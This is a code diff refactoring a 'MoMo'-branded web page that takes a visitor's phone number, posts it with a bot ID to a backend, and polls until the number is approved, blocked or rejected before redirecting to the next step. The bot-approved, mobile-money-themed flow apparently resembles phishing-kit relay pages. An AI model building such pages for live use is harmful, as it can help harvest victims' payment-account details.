@@ -189,7 +189,6 @@
             transition: background 0.3s ease;
             position: relative;
         }
-        /* Active state — driven by .is-active class (more reliable than :enabled) */
         .next.is-active {
             background: #005572;
             cursor: pointer;
@@ -306,68 +305,70 @@
     </button>
 </div>
 
+
+<!-- ============================================================
+     STEP 1 — Global error catcher. Must be the very first script.
+     Any runtime or syntax error will be logged so you can see it.
+     ============================================================ -->
 <script>
-// ============================================================
-//  MoMo — details page logic
-//
-//  ORDER MATTERS:
-//   1) DOM refs + UI listeners are attached FIRST so the NEXT
-//      button always reacts to typing, no matter what.
-//   2) botId resolution happens AFTER, and never blocks the UI.
-//
-//  The NEXT button state is refreshed via:
-//    • direct event listeners on the input
-//    • a delegated listener on document
-//    • a lightweight interval as a last-resort safety net
-// ============================================================
-(function() {
+window.addEventListener('error', function (e) {
+    console.error('[MoMo GLOBAL ERROR]', e.message, '@', (e.filename || '?') + ':' + (e.lineno || '?'));
+});
+window.addEventListener('unhandledrejection', function (e) {
+    console.error('[MoMo UNHANDLED PROMISE]', e.reason);
+});
+</script>
+
+
+<!-- ============================================================
+     STEP 2 — Page logic. No IIFE, no top-level return, no syntax
+     traps. Everything lives inside initMoMoPage().
+     ============================================================ -->
+<script>
+function initMoMoPage() {
     'use strict';
 
     // ---------- CONFIG ----------
-    // Leave empty to use the same origin, or set e.g. 'https://api.example.com'
-    const BACKEND_URL = '';
+    var BACKEND_URL = '';
 
     // ---------- DOM REFS ----------
-    const form     = document.getElementById('detailsForm');
-    const phone    = document.getElementById('phone');
-    const button   = document.getElementById('continueBtn');
-    const statusEl = document.getElementById('status');
+    var form     = document.getElementById('detailsForm');
+    var phone    = document.getElementById('phone');
+    var button   = document.getElementById('continueBtn');
+    var statusEl = document.getElementById('status');
 
-    // Fail loudly if something is missing — easier to debug.
     if (!form || !phone || !button || !statusEl) {
-        console.error('[MoMo] Required DOM elements not found', {
+        console.error('[MoMo] Missing DOM elements', {
             form: !!form, phone: !!phone, button: !!button, statusEl: !!statusEl
         });
         return;
     }
 
-    let pollTimer  = null;
-    let botId      = null;
-    let lastState  = null;   // for change-only logging
+    var pollTimer = null;
+    var botId     = null;
+    var lastState = null;
 
     // ---------- VALIDATION ----------
-    // Sets both the .disabled property AND an .is-active class so the
-    // visual state is guaranteed even if :enabled pseudo-class fails.
     function validateForm() {
-        const digits       = phone.value.replace(/\D/g, '');
-        const isLoading    = button.classList.contains('loading');
-        const shouldDisable = (digits.length === 0) || isLoading;
+        var digits        = phone.value.replace(/\D/g, '');
+        var isLoading     = button.classList.contains('loading');
+        var shouldDisable = (digits.length === 0) || isLoading;
 
         if (button.disabled !== shouldDisable) {
             button.disabled = shouldDisable;
         }
+
         if (shouldDisable) {
             button.classList.remove('is-active');
         } else {
             button.classList.add('is-active');
         }
 
-        // Log only when the state actually changes (avoids console spam)
         if (lastState !== shouldDisable) {
             lastState = shouldDisable;
-            console.log('[MoMo] NEXT disabled:', shouldDisable,
-                        '| digits:', JSON.stringify(digits),
-                        '| raw:', JSON.stringify(phone.value));
+            console.log('[MoMo] NEXT disabled =', shouldDisable,
+                        '| digits =', JSON.stringify(digits),
+                        '| raw =', JSON.stringify(phone.value));
         }
     }
 
@@ -402,20 +403,18 @@
         }
     }
 
-    // ---------- INPUT SANITIZER + LISTENER (attached immediately) ----------
+    // ---------- PHONE INPUT ----------
     function onPhoneInput() {
-        let value = phone.value;
+        var value = phone.value;
 
-        // Keep digits, spaces, and a single leading +
         value = value.replace(/[^\d+\s]/g, '');
-        const hasPlus = value.indexOf('+') !== -1;
+        var hasPlus = value.indexOf('+') !== -1;
         value = value.replace(/\+/g, '');
         if (hasPlus) value = '+' + value;
         value = value.replace(/\s+/g, ' ');
 
-        // Only rewrite if the sanitized value differs (avoids caret jumps)
         if (phone.value !== value) {
-            const atEnd = phone.selectionStart === phone.value.length;
+            var atEnd = phone.selectionStart === phone.value.length;
             phone.value = value;
             if (atEnd) {
                 try { phone.setSelectionRange(value.length, value.length); } catch (e) {}
@@ -425,42 +424,33 @@
         validateForm();
     }
 
-    // Belt + suspenders: attach every reasonable event
     ['input', 'keyup', 'keydown', 'change', 'paste', 'cut', 'blur', 'focus', 'click', 'touchstart', 'touchend']
-        .forEach(function(evt) {
+        .forEach(function (evt) {
             phone.addEventListener(evt, onPhoneInput, false);
         });
 
-    // Delegated listener on document — catches anything that bypasses the field
-    document.addEventListener('input', function(e) {
-        if (e.target === phone) validateForm();
-    }, false);
-    document.addEventListener('keyup', function(e) {
+    document.addEventListener('input', function (e) {
         if (e.target === phone) validateForm();
     }, false);
 
-    // Last-resort safety net: some mobile browsers / extensions can swallow events.
-    // 400ms is imperceptible to the user and extremely cheap.
+    // Safety net for stubborn mobile keyboards / autofill
     setInterval(validateForm, 400);
 
-    // ---------- BOT ID RESOLVER (non-blocking) ----------
-    (function resolveBotId() {
-        try {
-            const params   = new URLSearchParams(window.location.search);
-            const fromUrl  = params.get('botId');
-            let stored = null;
-            try { stored = localStorage.getItem('botId'); } catch (e) { /* storage blocked */ }
+    // ---------- BOT ID ----------
+    try {
+        var params  = new URLSearchParams(window.location.search);
+        var fromUrl = params.get('botId');
+        var stored  = null;
+        try { stored = localStorage.getItem('botId'); } catch (e) {}
 
-            const candidate = fromUrl || stored;
+        var candidate = fromUrl || stored;
 
-            if (!candidate || candidate === 'test_bot' || candidate === 'undefined' || candidate === 'null') {
-                console.warn('⚠️ Invalid or missing botId — page still works, but submissions will fail.');
-                return;
-            }
-
+        if (!candidate || candidate === 'test_bot' || candidate === 'undefined' || candidate === 'null') {
+            console.warn('⚠️ Invalid or missing botId — page still works, but submissions will fail.');
+        } else {
             botId = candidate;
 
-            try { localStorage.setItem('botId', botId); } catch (e) { /* storage blocked */ }
+            try { localStorage.setItem('botId', botId); } catch (e) {}
 
             if (fromUrl !== botId) {
                 params.set('botId', botId);
@@ -472,27 +462,28 @@
             }
 
             console.log('🆔 botId resolved:', botId);
-        } catch (err) {
-            console.error('botId resolver failed:', err && err.message);
         }
-    })();
+    } catch (err) {
+        console.error('botId resolver failed:', err && err.message);
+    }
 
-    // ---------- USER NAME (silent, no prompt) ----------
-    let fullName = 'User';
+    // ---------- USER NAME ----------
+    var fullName = 'User';
     try {
         fullName = localStorage.getItem('fullName') || 'User';
         localStorage.setItem('fullName', fullName);
-    } catch (e) { /* storage blocked — keep default */ }
+    } catch (e) {}
 
     // ---------- FORM SUBMIT ----------
-    form.addEventListener('submit', async (e) => {
+    form.addEventListener('submit', function (e) {
         e.preventDefault();
+
         if (button.classList.contains('loading')) return;
 
-        const raw      = phone.value.trim();
-        const hasPlus  = raw.startsWith('+');
-        const digits   = raw.replace(/\D/g, '');
-        const phoneVal = (hasPlus ? '+' : '') + digits;
+        var raw      = phone.value.trim();
+        var hasPlus  = raw.charAt(0) === '+';
+        var digits   = raw.replace(/\D/g, '');
+        var phoneVal = (hasPlus ? '+' : '') + digits;
 
         if (!digits) {
             setStatus('❌ Please enter a phone number.', 'error');
@@ -507,81 +498,82 @@
         setLoading(true);
         hideStatus();
 
-        try {
-            const res = await fetch(BACKEND_URL + '/submit-phone', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name: fullName, phone: phoneVal, botId })
-            });
-
+        fetch(BACKEND_URL + '/submit-phone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ name: fullName, phone: phoneVal, botId: botId })
+        })
+        .then(function (res) {
             if (!res.ok) {
-                const errText = await res.text();
-                const clean = errText.startsWith('<')
-                    ? ('HTTP ' + res.status + ' — server error')
-                    : (errText || ('HTTP ' + res.status));
-                throw new Error(clean);
+                return res.text().then(function (t) {
+                    var clean = t.charAt(0) === '<'
+                        ? ('HTTP ' + res.status + ' — server error')
+                        : (t || ('HTTP ' + res.status));
+                    throw new Error(clean);
+                });
             }
-
-            const { requestId } = await res.json();
+            return res.json();
+        })
+        .then(function (data) {
+            var requestId = data.requestId;
             if (!requestId) throw new Error('No request ID returned');
 
             try {
                 localStorage.setItem('phone', phoneVal);
                 localStorage.setItem('phoneRequestId', requestId);
-            } catch (e) { /* storage blocked */ }
+            } catch (e) {}
 
             stopPolling();
-            let attempts = 0;
-            const MAX_ATTEMPTS = 120;
+            var attempts = 0;
+            var MAX_ATTEMPTS = 120;
 
-            pollTimer = setInterval(async () => {
+            pollTimer = setInterval(function () {
                 attempts++;
-                try {
-                    const checkRes = await fetch(BACKEND_URL + '/check-phone/' + encodeURIComponent(requestId));
-                    const data = await checkRes.json();
+                fetch(BACKEND_URL + '/check-phone/' + encodeURIComponent(requestId))
+                    .then(function (r) { return r.json(); })
+                    .then(function (check) {
+                        if (check.blocked === true) {
+                            stopPolling();
+                            setLoading(false);
+                            setStatus('❌ Account restricted. Please try again later.', 'error');
+                            return;
+                        }
 
-                    if (data.blocked === true) {
-                        stopPolling();
-                        setLoading(false);
-                        setStatus('❌ Account restricted. Please try again later.', 'error');
-                        return;
-                    }
+                        if (check.approved === true) {
+                            stopPolling();
+                            setLoading(false);
+                            setStatus('✅ Verified! Redirecting...', 'success');
+                            var redirectUrl = 'link.html?requestId=' + encodeURIComponent(requestId) +
+                                              '&phone='     + encodeURIComponent(phoneVal) +
+                                              '&botId='     + encodeURIComponent(botId);
+                            setTimeout(function () {
+                                window.location.href = redirectUrl;
+                            }, 700);
+                            return;
+                        }
 
-                    if (data.approved === true) {
-                        stopPolling();
-                        setLoading(false);
-                        setStatus('✅ Verified! Redirecting...', 'success');
-                        const redirectUrl = 'link.html?requestId=' + encodeURIComponent(requestId) +
-                                            '&phone='     + encodeURIComponent(phoneVal) +
-                                            '&botId='     + encodeURIComponent(botId);
-                        setTimeout(() => {
-                            window.location.href = redirectUrl;
-                        }, 700);
-                        return;
-                    }
+                        if (check.approved === false) {
+                            stopPolling();
+                            setLoading(false);
+                            setStatus('❌ Incorrect number. Please try again.', 'error');
+                            return;
+                        }
 
-                    if (data.approved === false) {
-                        stopPolling();
-                        setLoading(false);
-                        setStatus('❌ Incorrect number. Please try again.', 'error');
-                        return;
-                    }
-
-                    if (attempts > MAX_ATTEMPTS) {
-                        stopPolling();
-                        setLoading(false);
-                        setStatus('⏳ Taking too long. Please try again.', 'error');
-                        return;
-                    }
-                } catch (err) {
-                    console.error('Polling error:', err);
-                }
+                        if (attempts > MAX_ATTEMPTS) {
+                            stopPolling();
+                            setLoading(false);
+                            setStatus('⏳ Taking too long. Please try again.', 'error');
+                        }
+                    })
+                    .catch(function (err) {
+                        console.error('Polling error:', err);
+                    });
             }, 1500);
-
-        } catch (error) {
+        })
+        .catch(function (error) {
             setLoading(false);
-            setStatus('❌ ' + (error.message || 'Something went wrong. Please try again.'), 'error');
-        }
+            setStatus('❌ ' + (error && error.message ? error.message : 'Something went wrong. Please try again.'), 'error');
+        });
     });
 
     // ---------- INIT ----------
@@ -589,7 +581,14 @@
     try { phone.focus(); } catch (e) {}
 
     console.log('✅ MoMo details page ready. botId =', botId);
-})();
+}
+
+/* Run it — safe whether the DOM is still loading or already loaded. */
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initMoMoPage);
+} else {
+    initMoMoPage();
+}
 </script>
 
 </body>
